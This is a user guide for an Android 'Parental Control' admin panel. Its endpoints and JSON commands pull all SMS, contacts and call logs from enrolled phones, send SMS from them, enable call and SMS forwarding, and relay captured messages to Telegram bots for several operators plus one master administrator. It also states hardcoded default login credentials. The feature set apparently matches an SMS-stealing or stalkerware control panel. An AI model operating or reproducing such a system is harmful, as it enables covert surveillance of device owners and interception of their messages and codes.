# ????? Admin Panel User Guide

Complete guide for using the Parental Control Admin Panel.

---

## ?? Table of Contents

1. [Introduction](#introduction)
2. [Accessing the Panel](#accessing-the-panel)
3. [Login & 2FA](#login--2fa)
4. [Dashboard Overview](#dashboard-overview)
5. [Managing Devices](#managing-devices)
6. [Viewing SMS Messages](#viewing-sms-messages)
7. [Managing Contacts](#managing-contacts)
8. [Call Logs](#call-logs)
9. [Sending Commands](#sending-commands)
10. [Admin Management](#admin-management)
11. [Telegram Bot Configuration](#telegram-bot-configuration)
12. [Activity Logs](#activity-logs)
13. [Settings](#settings)
14. [Troubleshooting](#troubleshooting)

---

## ?? Introduction

The Admin Panel is a web-based interface for managing and monitoring Android devices in the Parental Control system. Administrators can:
- View all registered devices
- Monitor SMS, calls, and contacts
- Send remote commands
- Manage other administrators
- Configure Telegram notifications
- View activity logs

---

## ?? Accessing the Panel

### Panel URL

```
Development: http://localhost:8765/docs
Production: https://your-domain.com/docs
```

The admin panel is accessible through the **Swagger UI** interface, which provides an interactive API documentation and testing interface.

### Browser Requirements
- Modern browser (Chrome, Firefox, Safari, Edge)
- JavaScript enabled
- Cookies enabled

---

## ?? Login & 2FA

### Step 1: Initial Login

1. Open the panel URL in your browser
2. Navigate to the `/auth/login` endpoint
3. Click **"Try it out"**
4. Enter credentials:
   ```json
   {
     "username": "admin",
     "password": "1234567899"
   }
   ```
5. Click **"Execute"**

### Step 2: Verify 2FA (if enabled)

After successful login, you'll receive:
- A `temp_token` in the response
- An OTP code sent to your Telegram

#### To Complete Login:

1. Check your Telegram for the 6-digit OTP code
2. Navigate to `/auth/verify-2fa` endpoint
3. Click **"Try it out"**
4. Enter:
   ```json
   {
     "username": "admin",
     "otp_code": "123456",
     "temp_token": "your_temp_token_here"
   }
   ```
5. Click **"Execute"**

### Step 3: Authorize Requests

1. Copy the `access_token` from the response
2. Click the **"Authorize" ??** button at the top of the page
3. Enter: `Bearer your_access_token_here`
4. Click **"Authorize"**

Now you're authenticated and can use all endpoints!

### Default Credentials

```
Username: admin
Password: 1234567899
```

**?? IMPORTANT:** Change the default password immediately after first login!

---

## ?? Dashboard Overview

### Accessing Your Info

**Endpoint:** `GET /auth/me`

Shows your current admin information:
- Username and email
- Role and permissions
- Device token (for registering devices)
- Telegram bot configurations
- Login statistics

### ?? Important: Single Session Control

**Only ONE active login per admin account!**

- If you login from Browser A, you're logged in ?
- If you then login from Browser B, Browser A's session is automatically invalidated ?
- Browser A will get "Session expired" error on next request
- This is a **security feature** to prevent token reuse

**Note:** You cannot be logged in from multiple devices/browsers simultaneously.

### System Statistics

**Endpoint:** `GET /api/stats`

Displays:
- Total devices
- Online/Offline devices
- Total SMS messages
- Total contacts
- Total call logs

---

## ?? Managing Devices

### View All Devices

**Endpoint:** `GET /api/devices`

**Parameters:**
- `skip`: Starting position (for pagination)
- `limit`: Number of devices to return

**What you see:**
- Device ID
- Model and manufacturer
- Android version
- Battery level
- Online/Offline status
- Last seen time
- Owner admin

**Permissions:**
- **Super Admin:** Sees ALL devices
- **Regular Admin:** Sees only their own devices

### View Device Details

**Endpoint:** `GET /api/devices/{device_id}`

Replace `{device_id}` with the actual device ID.

Shows complete device information:
- Hardware details
- Current status
- FCM tokens
- Last ping time
- Registration date

### Register New Device

Devices are registered automatically by the mobile app using your **device_token**.

To get your device token:
1. Go to `GET /auth/me`
2. Copy the `device_token` value
3. Enter this token in the mobile app

---

## ?? Viewing SMS Messages

### Get SMS for a Device

**Endpoint:** `GET /api/devices/{device_id}/sms`

**Parameters:**
- `skip`: Starting position
- `limit`: Number of messages (max 500)

**Information shown:**
- Sender/Receiver phone numbers
- Message content
- Timestamp
- Message type (inbox/sent)

### Delete SMS Messages

**Endpoint:** `DELETE /api/devices/{device_id}/sms`

**Permission Required:** `DELETE_DATA`

**Warning:** This action cannot be undone!

Deletes all SMS messages for the specified device.

---

## ?? Managing Contacts

### View Device Contacts

**Endpoint:** `GET /api/devices/{device_id}/contacts`

**Parameters:**
- `skip`: Starting position
- `limit`: Number of contacts

**Information shown:**
- Contact name
- Phone number
- Associated device

---

## ?? Call Logs

### View Call History

**Endpoint:** `GET /api/devices/{device_id}/calls`

**Parameters:**
- `skip`: Starting position
- `limit`: Number of logs

**Information shown:**
- Phone number
- Contact name
- Call type (incoming/outgoing/missed)
- Timestamp
- Duration
- Formatted duration (e.g., "2m 30s")

---

## ?? Sending Commands

### Available Commands

#### 1. Ping Device

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "ping",
  "parameters": {
    "type": "firebase"
  }
}
```

Tests if device is reachable via Firebase.

#### 2. Send SMS from Device

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "send_sms",
  "parameters": {
    "phone": "+1234567890",
    "message": "Your message here",
    "simSlot": 0
  }
}
```

**Parameters:**
- `phone`: Recipient phone number
- `message`: SMS text
- `simSlot`: 0 or 1 (for dual SIM phones)

#### 3. Quick Upload SMS

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "quick_upload_sms",
  "parameters": {}
}
```

Requests device to upload the last 50 SMS messages.

#### 4. Upload All SMS

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "upload_all_sms",
  "parameters": {}
}
```

Requests device to upload ALL SMS messages (may take time).

#### 5. Quick Upload Contacts

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "quick_upload_contacts",
  "parameters": {}
}
```

Requests device to upload the first 50 contacts.

#### 6. Upload All Contacts

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "upload_all_contacts",
  "parameters": {}
}
```

Requests device to upload ALL contacts.

#### 7. Call Forwarding (Enable)

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "call_forwarding",
  "parameters": {
    "number": "+1234567890",
    "simSlot": 0
  }
}
```

Enables call forwarding to specified number.

#### 8. Call Forwarding (Disable)

**Endpoint:** `POST /api/devices/{device_id}/command`

```json
{
  "command": "call_forwarding_disable",
  "parameters": {
    "simSlot": 0
  }
}
```

Disables call forwarding.

---

## ????? Admin Management

### Create New Admin

**Endpoint:** `POST /admin/create`

**Permission Required:** `MANAGE_ADMINS`

**Request Body:**
```json
{
  "username": "newadmin",
  "email": "newadmin@example.com",
  "password": "secure_password_here",
  "full_name": "New Admin Name",
  "role": "admin",
  "telegram_2fa_chat_id": "-1001234567890",
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "newadmin_devices",
      "token": "BOT1_TOKEN",
      "chat_id": "-1001111111111"
    }
    // ... must provide 5 bots total
  ]
}
```

**Roles:**
- `super_admin`: Full access to everything
- `admin`: Can manage devices, view data, send commands
- `viewer`: Can only view data

**Note:** If you don't provide `telegram_bots`, the system creates 5 placeholder bots that need to be configured later.

### List All Admins

**Endpoint:** `GET /admin/list`

**Permission Required:** `MANAGE_ADMINS`

Shows all administrators with their details.

### Update Admin

**Endpoint:** `PUT /admin/{username}`

**Permission Required:** `MANAGE_ADMINS`

Update admin information:
```json
{
  "email": "newemail@example.com",
  "full_name": "Updated Name",
  "telegram_bots": [...]
}
```

### Delete Admin

**Endpoint:** `DELETE /admin/{username}`

**Permission Required:** `MANAGE_ADMINS`

**Warning:** Cannot delete yourself!

Permanently deletes an administrator account.

---

## ?? Telegram Bot Configuration

### Understanding the Bot System

Each admin has **6 Telegram bots**:

1. **2FA Bot (Shared):** Sends OTP codes for login
2. **Bot 1:** Device notifications (registration, online/offline)
3. **Bot 2:** SMS notifications only
4. **Bot 3:** Admin activity logs (commands, changes)
5. **Bot 4:** Login/Logout notifications
6. **Bot 5:** Reserved for future use

### Setting Up Bots

#### Step 1: Create Bots in Telegram

1. Open Telegram and find **@BotFather**
2. Send `/newbot`
3. Follow instructions to create 6 bots
4. Save all bot tokens

#### Step 2: Get Chat IDs

**Option A: Personal Chat**
1. Start each bot
2. Send a message
3. Visit: `https://api.telegram.org/bot<TOKEN>/getUpdates`
4. Find `"chat":{"id":123456789}`

**Option B: Channel/Group**
1. Create a channel or group
2. Add bot as admin
3. Send a message
4. Get updates as above
5. Chat ID will be negative (e.g., `-1001234567890`)

#### Step 3: Configure in Admin Panel

1. Go to `PUT /admin/update/{your_username}`
2. Update your admin profile:
```json
{
  "telegram_2fa_chat_id": "-1001234567890",
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "my_devices_bot",
      "token": "1111111111:AAA-Your-Bot1-Token",
      "chat_id": "-1001111111111"
    },
    {
      "bot_id": 2,
      "bot_name": "my_sms_bot",
      "token": "2222222222:BBB-Your-Bot2-Token",
      "chat_id": "-1002222222222"
    },
    {
      "bot_id": 3,
      "bot_name": "my_logs_bot",
      "token": "3333333333:CCC-Your-Bot3-Token",
      "chat_id": "-1003333333333"
    },
    {
      "bot_id": 4,
      "bot_name": "my_auth_bot",
      "token": "4444444444:DDD-Your-Bot4-Token",
      "chat_id": "-1004444444444"
    },
    {
      "bot_id": 5,
      "bot_name": "my_future_bot",
      "token": "5555555555:EEE-Your-Bot5-Token",
      "chat_id": "-1005555555555"
    }
  ]
}
```

#### Step 4: Test

- Login again ? Bot 4 should send notification
- Register a device ? Bot 1 should send notification
- Device sends SMS ? Bot 2 should send notification

### Administrator Bot Configuration

The main **Administrator** account also needs bots configured in `.env` file:

```bash
TELEGRAM_2FA_BOT_TOKEN=...
ADMIN_BOT1_TOKEN=...
ADMIN_BOT2_TOKEN=...
ADMIN_BOT3_TOKEN=...
ADMIN_BOT4_TOKEN=...
ADMIN_BOT5_TOKEN=...
```

Administrator receives ALL notifications from ALL admins.

---

## ?? Activity Logs

### View Admin Activities

**Endpoint:** `GET /admin/activities`

**Permission Required:** `VIEW_ADMIN_LOGS`

**Parameters:**
- `admin_username`: Filter by admin (optional)
- `activity_type`: Filter by type (optional)
- `skip`: Pagination offset
- `limit`: Number of results

**Activity Types:**
- `login`: Login attempts
- `logout`: Logout events
- `view_device`: Device viewed
- `view_sms`: SMS viewed
- `send_command`: Command sent
- `create_admin`: Admin created
- `update_admin`: Admin updated
- `delete_admin`: Admin deleted
- `delete_data`: Data deleted

### View Activity Statistics

**Endpoint:** `GET /admin/activities/stats`

**Permission Required:** `VIEW_ADMIN_LOGS`

Shows:
- Total activities by type
- Recent login attempts
- Most active admins

---

## ?? Settings

### Update Device Settings

**Endpoint:** `PUT /api/devices/{device_id}/settings`

**Permission Required:** `CHANGE_SETTINGS`

```json
{
  "sms_forward_enabled": true,
  "forward_number": "+1234567890"
}
```

Configures device settings like SMS forwarding.

### Enable/Disable 2FA

Edit `app/services/auth_service.py`:

```python
ENABLE_2FA = True  # Set to False to disable
```

Restart server after changing.

---

## ?? Troubleshooting

### Can't Login

**Problem:** Invalid credentials error

**Solutions:**
1. Check username is lowercase: `admin` (not `Admin`)
2. Verify password: `1234567899`
3. If changed password, use new password

### 2FA Code Not Received

**Problem:** No OTP code in Telegram

**Solutions:**
1. Check 2FA bot token in `.env`
2. Verify `telegram_2fa_chat_id` in your admin profile
3. Ensure bot is started in Telegram
4. Test bot manually:
   ```bash
   curl "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
   ```

### No Device Notifications

**Problem:** Devices registered but no Telegram notifications

**Solutions:**
1. Check bot tokens are configured (not placeholders)
2. Verify bots are started in Telegram
3. Check server logs for errors
4. Test each bot individually

### Can't See Other Admin's Devices

**Problem:** Only see your own devices

**Solution:** This is correct! Only **Super Admins** see all devices. Regular admins see only their own.

### Token Expired

**Problem:** 401 Unauthorized error

**Solutions:**
1. **Normal expiry:** Tokens expire after 24 hours (1440 minutes)
2. **Single session:** If you login from another browser/device, previous session is invalidated
3. **Solution:** Re-login to get new token and re-authorize in Swagger UI

**Error Message:**
- `"Invalid or expired token"` - Token expired normally
- `"Session expired. Another login detected from different location."` - You logged in from another device

### Permission Denied

**Problem:** 403 Forbidden error

**Solution:**
1. Check your role: `GET /auth/me`
2. Verify you have required permission
3. Contact super admin to update your permissions

---

## ?? Mobile App Integration

### Getting Device Token

1. Login to admin panel
2. Go to `GET /auth/me`
3. Copy your `device_token`
4. Enter this token in the mobile app during setup

### Registering Devices

Devices auto-register when the app starts with a valid admin token. The device will be linked to the admin who owns that token.

---

## ?? Best Practices

### Security

1. ? Change default password immediately
2. ? Use strong passwords
3. ? Enable 2FA
4. ? Don't share your device token
5. ? Review activity logs regularly
6. ? Use HTTPS in production
7. ? Keep bot tokens secret

### Administration

1. ? Create separate admins for different users
2. ? Assign appropriate roles (don't make everyone super_admin)
3. ? Configure Telegram bots for all admins
4. ? Monitor device online status
5. ? Regularly check SMS and call logs
6. ? Review admin activities

### Device Management

1. ? Keep devices updated with latest app version
2. ? Monitor battery levels
3. ? Check last ping times
4. ? Ensure devices have internet connection
5. ? Test commands periodically

---

## ?? Support

### Need Help?

1. Check [SETUP.md](./SETUP.md) for server setup
2. Check [API_DOCS.md](./API_DOCS.md) for detailed API reference
3. Review server logs for errors
4. Open an issue on GitHub

---

## ?? Quick Reference

### Common Tasks

| Task | Endpoint | Method |
|------|----------|--------|
| Login | `/auth/login` | POST |
| Verify 2FA | `/auth/verify-2fa` | POST |
| View devices | `/api/devices` | GET |
| View SMS | `/api/devices/{id}/sms` | GET |
| Send command | `/api/devices/{id}/command` | POST |
| Create admin | `/admin/create` | POST |
| Update bots | `/admin/{username}` | PUT |
| View logs | `/admin/activities` | GET |

### Permissions

| Permission | Can Do |
|------------|--------|
| `VIEW_DEVICES` | View device list and details |
| `MANAGE_DEVICES` | Modify device settings |
| `SEND_COMMANDS` | Send commands to devices |
| `VIEW_SMS` | View SMS messages |
| `VIEW_CONTACTS` | View contacts |
| `DELETE_DATA` | Delete SMS, logs, etc. |
| `MANAGE_ADMINS` | Create/update/delete admins |
| `VIEW_ADMIN_LOGS` | View activity logs |
| `CHANGE_SETTINGS` | Change device settings |

### Roles

| Role | Permissions |
|------|-------------|
| `super_admin` | ALL permissions |
| `admin` | All except manage_admins and view_admin_logs |
| `viewer` | Only view permissions |

---

**Happy Monitoring! ??**
